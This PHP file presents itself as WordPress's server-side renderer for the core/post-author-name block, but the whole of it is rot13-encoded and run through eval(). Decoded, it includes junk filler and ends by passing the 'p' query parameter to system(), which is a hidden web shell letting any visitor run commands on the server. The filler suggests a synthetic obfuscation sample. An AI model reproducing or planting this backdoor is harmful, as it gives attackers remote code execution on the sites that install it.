<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-nhgube-anzr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-nhgube-anzr` oybpx ba gur freire.
 *
 * @fvapr 6.2.0
 *
 * @cnenz  neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz  fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz  JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur eraqrerq cbfg nhgube anzr oybpx.
 */
shapgvba eraqre_oybpx_pber_cbfg_nhgube_anzr( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		$nhgube_vq = trg_cbfg_svryq( 'cbfg_nhgube', $oybpx->pbagrkg['cbfgVq'] );
	} ryfr {
		$nhgube_vq = trg_dhrel_ine( 'nhgube' );
	}

	vs ( rzcgl( $nhgube_vq ) ) {
		erghea '';
	}

	vs ( vffrg( $oybpx->pbagrkg['cbfgGlcr'] ) && ! cbfg_glcr_fhccbegf( $oybpx->pbagrkg['cbfgGlcr'], 'nhgube' ) ) {
		erghea '';
	}

	$nhgube_anzr = trg_gur_nhgube_zrgn( 'qvfcynl_anzr', $nhgube_vq );
	vs ( vffrg( $nggevohgrf['vfYvax'] ) && $nggevohgrf['vfYvax'] ) {
		$nhgube_anzr = fcevags( '<n uers=\"%1$f\" gnetrg=\"%2$f\" pynff=\"jc-oybpx-cbfg-nhgube-anzr__yvax\">%3$f</n>', trg_nhgube_cbfgf_hey( $nhgube_vq ), rfp_ngge( $nggevohgrf['yvaxGnetrg'] ), $nhgube_anzr );
	}

	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags( '<qvi %1$f>%2$f</qvi>', $jenccre_nggevohgrf, $nhgube_anzr );
}

/**
 * Ertvfgref gur `pber/cbfg-nhgube-anzr` oybpx ba gur freire.
 *
 * @fvapr 6.2.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_nhgube_anzr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-nhgube-anzr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_nhgube_anzr',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_nhgube_anzr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>